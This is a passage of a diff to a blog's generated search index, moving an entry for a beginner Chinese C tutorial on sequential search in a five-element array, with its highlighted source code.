+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入%d个数：\n"</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"此数组："</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n请输入你要查找的数字：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="keyword">if</span>(a[i]==x)</span><br><span class="line">			<span class="keyword">break</span>;			</span><br><span class="line">	<span class="keyword">if</span>(i&lt;N)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d的下标为%d\n"</span>,x,i);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果： </p>
+<p><img src="//czheisenberg.github.io/2019/08/17/顺序查找/666.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>阶乘</title>
     <url>/2019/08/24/%E9%98%B6%E4%B9%98/</url>
     <content><![CDATA[<h1 id="阶乘"><a href="#阶乘" class="headerlink" title="阶乘"></a>阶乘</h1><p>比如 5！=5X4X3X2X1  =120</p>
@@ -1204,25 +1252,6 @@
 
 <p>运行结果：</p>
 <p><img src="//czheisenberg.github.io/2019/08/24/阶乘/j.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>顺序查找</title>
-    <url>/2019/08/17/%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/</url>
-    <content><![CDATA[<h1 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h1><p>输入一个数，确定它在数组中的位置，如果没有这个数输出-1，否则输出它的下标！</p>
-<p>源代码：</p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,x;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入%d个数：\n"</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"此数组："</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n请输入你要查找的数字：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="keyword">if</span>(a[i]==x)</span><br><span class="line">			<span class="keyword">break</span>;			</span><br><span class="line">	<span class="keyword">if</span>(i&lt;N)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d的下标为%d\n"</span>,x,i);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果： </p>
-<p><img src="//czheisenberg.github.io/2019/08/17/顺序查找/666.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
